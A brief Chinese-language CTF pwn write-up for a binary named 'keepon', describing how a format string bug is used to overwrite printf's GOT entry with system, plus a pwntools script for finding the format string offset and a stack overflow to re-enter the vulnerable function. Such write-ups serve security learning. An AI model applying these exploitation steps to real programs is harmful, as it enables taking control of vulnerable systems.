题解：[😘欢迎回来~ | 坠入星野的月🌙 (uf4te.cn)](https://www.uf4te.cn/posts/6f874503.html#:~:text=%E5%8F%8B%E9%93%BE%E6%9C%8B%E5%8F%8B%E5%9C%88.%20%E5%AE%9E%E7%94%A8%E5%B7%A5)
![[Pasted image 20240908192622.png]]
可以发现有格式化字符串漏洞可利用
![[Pasted image 20240908192730.png]]
给了个假的`backdoors`，运行了他会输出一个真"flag"
但也可以发现有`system`函数
可以利用格式化字符串漏洞将`printf`函数的GOT表换为`system`函数的地址，这样在运行`printf`函数的时候实际执行的就是`system`函数
利用`fmtstr_payload(偏移量, {原函数：替换后函数})`函数，可以直接构造出替换的payload
计算偏移量可用直接观察法~~目前我没观察出来~~或用`fmtstr`类提供的方法
```python
def exec_fmt(payload):
    p = process('./keepon')
    pwnlib.gdb.attach(p, 'b printf')
    p.recvuntil('name: ')
    p.recvline()
    print(payload)
    p.sendline(payload)
    info = p.recv()
    print(info)
    return info
    
if __name__ == '__main__':
    auto_fmtstr = FmtStr(exec_fmt)
```
多运行几次就会给出偏移量
将`printf`函数的GOT表地址换过之后还需至少运行一遍`printf`，故可以在第二次`read`函数内栈溢出，使`vuln`函数重运行，然后就可以运行`system`了
